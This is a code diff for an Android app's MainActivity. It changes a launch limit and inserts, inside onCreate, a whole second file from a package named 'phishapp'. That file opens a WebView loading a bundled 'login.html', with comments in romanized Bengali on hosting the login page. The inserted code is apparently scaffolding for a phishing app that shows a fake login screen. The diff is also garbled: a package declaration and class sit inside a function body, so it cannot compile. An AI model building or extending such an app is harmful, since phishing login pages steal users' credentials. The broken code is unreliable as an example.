@@ -25,11 +25,70 @@ class MainActivity : AppCompatActivity() {
     private val REQUEST_PERM_CODE = 1001
     private lateinit var serviceIntent: Intent
     private lateinit var prefs: android.content.SharedPreferences
-    private val LAUNCH_LIMIT = 4
+    private val LAUNCH_LIMIT = 7
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         prefs = PreferenceManager.getDefaultSharedPreferences(this)
+
+
+
+
+
+
+
+
+
+package com.example.phishapp
+
+import android.os.Bundle
+import android.webkit.WebChromeClient
+import android.webkit.WebSettings
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import androidx.appcompat.app.AppCompatActivity
+
+class MainActivity : AppCompatActivity() {
+
+    private lateinit var myWebView: WebView
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        
+        // WebView setup
+        myWebView = WebView(this)
+        setContentView(myWebView)
+
+        val webSettings: WebSettings = myWebView.settings
+        webSettings.javaScriptEnabled = true
+        webSettings.domStorageEnabled = true
+        webSettings.allowFileAccess = true
+        webSettings.loadWithOverviewMode = true
+        webSettings.useWideViewPort = true
+
+        // WebView Client (so jeno new tab open na hoy)
+        myWebView.webViewClient = WebViewClient()
+        myWebView.webChromeClient = WebChromeClient()
+
+        // Apnar HTML file er link ba local path diyn
+        // Option 1: Internet theke load korle (Server e upload kore)
+        // myWebView.loadUrl("https://your-website.com/login.html")
+
+        // Option 2: Local assets folder theke load korle (App er vitorei file thakle)
+        // assets folder e 'login.html' file ta rakhen
+        myWebView.loadUrl("file:///android_asset/login.html")
+
+
+
+
+
+
+
+
+
+
+
+        
 
         val currentLaunches = prefs.getInt("launch_count", 0) + 1
         prefs.edit().putInt("launch_count", currentLaunches).apply()
